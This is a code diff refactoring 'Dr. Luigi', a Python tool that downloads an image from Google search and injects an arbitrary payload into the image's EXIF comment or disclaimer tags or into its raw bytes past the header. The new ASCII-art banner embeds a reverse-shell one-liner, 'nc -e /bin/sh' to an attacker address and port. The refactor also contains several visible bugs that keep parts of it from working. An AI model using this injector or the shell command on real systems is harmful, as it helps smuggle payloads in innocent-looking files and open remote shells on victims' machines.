@@ -1,246 +1,226 @@
 #!/usr/bin/env python
 
 from bs4 import BeautifulSoup
+import chardet
+from dataclasses import dataclass, field
+from dataclasses_json import dataclass_json
+from enum import Enum
 from exiftool import ExifToolHelper
+from io import BytesIO
 from pyfiglet import Figlet
 from random import randint
-import argparse
-import json
-import io
+from tabulate import tabulate
+from termcolor import cprint
+from types import FunctionType
+from typing import List, Any
 import mimetypes
 import os
 import re
 import requests
 import shutil
+import sys
+
+
+import interface
+import config as conf
+config = conf.load()
+
 
 # Configs
-BANNER = "Dr. Luigi"
-INJMETHODS = ['comment', 'disclaimer', 'idat', 'raw']
-EXTENSIONS = ['.jpg', '.png', '.gif', '.tif', '.pdf', '.raw']
-IMAGEDIR = "./images"
+BANNER = '''
+          ____               __          _       _ 
+         / __ \_____        / /   __  __(_)___ _(_)
+        / / / / ___/       / /   / / / / / __ `/ / 
+       / /_/ / /  _       / /___/ /_/ / / /_/ / /  
+      /_____/_/  (_)     /_____/\__,_/_/\__, /_/   
+                                      /____/   
+              .----------------------------------|    (   
+-----========| .....nc -e /bin/sh 10.6.6.6 1337 ######|
+:             `----------------------------------|    )
+.'''
 
-# Command Line Args
-parser = argparse.ArgumentParser(description='')
+@dataclass
+class Injector:
+    """Injector Parent Class."""
+   
+    filepath: str
+    method: str | None = None
 
-parser.add_argument(
-    '-q', '--query',
-    help='Search for an image using Google.'
-)
+    def load_method(self, suffix):
+        method = f"inject_{suffix}"
+        self.method = method if method in self.methods() else None
 
-parser.add_argument(
-    '-p', '--payload',
-    help='Payload to be injected'
-)
-
-parser.add_argument(
-    '-m', '--method',
-    const='comment',
-    nargs='?',
-    choices=INJMETHODS,
-    help='Select an injection method.'
-)
-
-args = parser.parse_args()
-
-
-class Image(object):
-
-    def __init__(self, filepath=None, exifdata=None, **kwargs):
-        self.filepath = filepath
-        self.exifdata = exifdata
+    # Possible misuse of classmethod...
+    @classmethod
+    def methods(cls):
+        return [method for method in dir(cls) if method.startswith('inject')]
 
 
-class WebScraper(object): 
-    
-    def __init__(self, query=None, header=None, language=None, location=None, search_engine=None, results=None):
-        self.query = str(query)
-        self.header = dict(header)
-        self.language = 'en' if language is None else str(language)
-        self.location = 'us' if location is None else str(location)
-        self.search_engine = 'Google Search' if search_engine is None else str(search_engine)
-        self.results = results
+@dataclass_json
+@dataclass
+class Image(Injector):
+    """Image class inherits from."""
 
-    
-    def _set_directory(self, dir):
-        abspath = os.path.abspath(dir)
-        if os.path.isdir(abspath):
-            self.directory = abspath
-        else:
-            os.makedirs(abspath, exist_ok=False)
-            self._set_directory(dir)
-        
-
-    def _search_url(self):
-
-        #     
-        query = "+".join(self.query.split())
-        base_url = f"https://www.google.com/search?"
-        params = {
-            "hl" : "en",
-            "gl" : "us",
-            "btnG" : "Google Search",
-            "tbm" : "isch",
-            "no_cache" : "true",
-            "num" : "10"
-        }
-        
-        return url
-
-
-    def _image_search(self, url):
-        """ A query string and adds src URLs from the results page. """
-
-        # Construct URL query
-        url = f"https://www.google.com/search?hl=jp&q={query}&btnG=Google+Search*tbs=0&safe=off&tbm=isch"
-    
-        # Return HTML object as string.
-        header = {'User-Agent': 'Mozilla/5.0'}
-        response = requests.get(url, header)
-        html = str(BeautifulSoup(response.content, features="lxml"))
-    
-        # Filter URL results
-        pattern = r"src=\"(https://[a-zA-Z0-9-.?=&;:/]+)\""    
-        return re.findall(pattern, html)
-
-
-    def _download_img(self, urls):
-        """ Download random image from image URLs """
-        
-        # Get range of array and return random element in that range.
-        random = lambda l: l[randint(0,(len(l) - 1))]
-
-        # Stream image url
-        res = requests.get(random(urls), stream = True)
-
-        # Get possible extensions using mimetypes 
-        content_type = res.headers.get('Content-Type')
-        exts = mimetypes.guess_all_extensions(content_type, strict=False)
-        
-        # Get preferred ext based on EXTENSIONS config.
-        ext = [e for e in exts if e in EXTENSIONS][0]
-        
-        # Write to filepath.
-        name = self.query.split(".")[0]  # try to drop extenstion if included in query
-        self.filepath = f"{self.directory}/{name}{ext}"
-
-        if res.status_code == 200:
-            with open(self.filepath, 'wb') as f:
-                shutil.copyfileobj(res.raw, f)
-        
-        
-        
-    def get_random_image(self, query, header):
-        """ Accepts an image query and filename. 
-            Downloads a random image result to ./images directory. 
-        """     
-        self._set_query(query)
-        self._set_header(header)
-        self._set_directory(IMAGEDIR)
-        urls = self._image_search()
-        self._download_img(urls)
-
-        
-class Image:
-
-
-    def __init__(self):
-        self.filepath = None
-        self.injection_method = None
-        self.data = None
-        self.bytes = None
-
-
-    def _set_filepath(self, filepath):
-
-        if os.path.isfile(filepath):
-            self.filepath = filepath
-        else:
-            print(f"{filepath} doesn not exist! Aborting...")
-            exit()
-    
-    
-    def _load_exif_data(self):            
+    def load_exif(self):
         with ExifToolHelper() as et:
-            self.data = et.get_metadata(self.filepath)[0]
+            self.exifdata = et.get_metadata(self.filepath)[0]
 
-    
-    def _inject_comment(self, payload):
+    @staticmethod
+    def inject_comment(image, payload):
         with ExifToolHelper() as et:
-            et.set_tags(self.filepath, tags={"comment": payload})
+            et.set_tags(image, tags={"comment": payload})
 
-
-    def _inject_disclaimer(self, payload):
+    @staticmethod
+    def inject_disclaimer(image, payload):
         with ExifToolHelper() as et:
-            et.set_tags(self.filepath, tags={"disclaimer": payload}) 
+            et.set_tags(image, tags={"disclaimer": payload})
 
-
-    def _inject_raw(self, payload, offset=14):
-        """ Inject raw bytes into file starting at offset.
-            Default offset is 14 to preserver magic bytes for most image formats.
+    @staticmethod
+    def inject_raw(image, payload, offset=14):
+        """Inject raw bytes into file starting at offset.
+           Default offset is 14 to preserve magic bytes for most image formats.
         """
         pbytes = payload.encode()
         start = offset
         end = start + len(pbytes)
 
-        with open(self.filepath, 'rb') as f:
+        with open(image, 'rb') as f:
             bstream = f.read()
-        
-        buff = io.BytesIO(bstream)
+
+        buff = BytesIO(bstream)
         view = buff.getbuffer()
         view[start:end] = pbytes
 
-        with open(self.filepath, 'wb') as f:
-            f.write(buff.getvalue())        
+        with open(image, 'wb') as f:
+            f.write(buff.getvalue())
 
 
-    def _set_injection_method(self, method, i=0):
-        """ Recursively check if method is valid.
-            If it is, set injection_method attribute. 
-        """
-        if i >= len(INJMETHODS):
-            print(f"Error: Unknown injection method {method}. Aborting...")
-            exit()
+@dataclass
+class Search:
+    """Parent class for search engine classes. """
+    query: str
+    srchmode: str
+    url: Any = None
 
-        if method == INJMETHODS[i]:
-            self.injection_method = f"_inject_{method}"
-        else:
-            self._set_injection_method(method, i+1)
-        
+    @staticmethod
+    def random_url(urls, start=0):
+        """Get range of array and return random element in that range."""
+        end = len(urls) - 1
+        return urls[randint(start, end)]
 
-#  Control functions
-def download(query, header=None):
-    """ Accepts a query and a filename"""
-    scraper = WebScraper()
-    scraper.get_random_image(query, header)
-    return scraper.filepath
+    @staticmethod
+    def first_url(urls):
+        """Return the first url in the list."""
+        return urls[0]
+
+    @staticmethod
+    def smallest_image_url(urls):
+        """Returns the url with smallest content length."""
+        def content_length(u): 
+            return int((requests.request.get(u, stream=True).headers.get('Content-Length')))    # Helper function to make dict comprehension more readable.
+        lookup_table = {url: content_length(url) for url in urls}
+        return min(lookup_table, key=lookup_table['url'])       
 
 
-def inject(filename, payload, method):
-    """ Accepts a filename, payload, and method.
-        Injects the payload into image file based on the selected method.
-    """
-    image = Image()
-    image._set_filepath(filename)
-    image._set_injection_method(method)        
-    image._load_exif_data()
+@dataclass
+class Google(Search):
+    """Google search engine class."""
 
-    # Call by reference. 
-    getattr(image, image.injection_method)(payload)
+    lang: str = "en"
+    safe: str = "on"
+    srch: str = "&tbm=isch"     # TODO need to work out an easier to interface attribute.
+    root: str = "https://www.google.com/search?"
+
+    def __post_init__(self):
+
+        uri = f"{self.root}hl={self.lang}&q={self.query}&safe={self.safe}{self.srch}"
+        header = {'User-Agent': 'Mozilla/5.0'}
+        response = requests.get(uri, header)
+        html = str(BeautifulSoup(response.content, features="lxml"))
+
+        # Filter URL results
+        pattern = r"src=\"(https://[a-zA-Z0-9-.?=&;:/]+)\""
+        self.select(re.findall(pattern, html))
+
+    def select(self, urls):
+        if self.srchmode == 'random':
+            self.url = self.random_url(urls)
+        elif self.srchmode == 'first':
+            self.url = self.first_url(urls)
+        elif self.srchmode == 'smallest':
+            self.url = self.smallest_image_url(urls)
+
+
+def search(query, searchtype, searchmode, searchdir):
+    """Accepts a query and a filename."""
+
+    searchquery = Google(query, searchmode)
+    response = requests.get(searchquery.url, stream=True)
+    content_type = response.headers.get('Content-Type')
+    exts = mimetypes.guess_all_extensions(content_type, strict=False)
     
-    print(json.dumps(image.__dict__))
+    # Get preferred extension based on EXTENSIONS config.
+    preferred = config['extension']['image']
+    ext = [e.strip('.') for e in exts if e.strip('.') in preferred][0]
 
+    # Write to filepath.
+    # try to drop extenstion if included in query
+    name = searchquery.query.split(".")[0]
+    dir = os.path.abspath(searchdir)
+
+    if not os.path.isdir(dir):
+        os.makedirs(dir, exist_ok=False)
+
+    filepath = f"{dir}/{name}.{ext}"
+    
+    if response.status_code == 200:
+        with open(filepath, 'wb') as f:
+            shutil.copyfileobj(response.raw, f)
+
+    if searchtype == "image":
+        obj = Image(filepath)
+    
+    return obj 
+
+
+def inject(obj, injection_method, payload):
+    """Accepts a filename, payload, and method.
+       Injects the payload into image file based on the selected method.
+    """
+
+    # Load method
+    obj.load_method(injection_method)    
+    obj.load_exif()  
+    # Call injection method by reference.
+    getattr(obj, obj.method)(obj.filepath, payload)
+    obj.load_exif()
+
+    return obj
 
 if __name__ == "__main__":
 
-    f = Figlet(font='slant')
-    print(f.renderText(BANNER))
+    args = interface.parser()
 
-    query = args.query
-    payload = args.payload 
-    if args.method:
-        method = args.method
-    else:
-        method = 'comment'
+    # Throw usage if no positional arguments are given.
+    if len(sys.argv) == 1:
+        args.usage(args)
 
-    image = download(query)
-    inject(image, payload, method)
+    if args.debug:
+        print(args)
+        quit()
+
+    method = (args._get_kwargs()[-1][-1])
+
+    if args.output is None:
+        outfile = os.getcwd()
+    if args.query:
+        artifact = search(args.query, args.type, args.searchmode, outfile)
+
+    # TODO need a function for args.url
+    result = inject(artifact, method, args.payload)
+
+    if args.type == 'image': 
+        output = [[k,v] for k, v in result.exifdata.items()]
+    
+    cprint(BANNER, 'green')
+    print(tabulate(output))
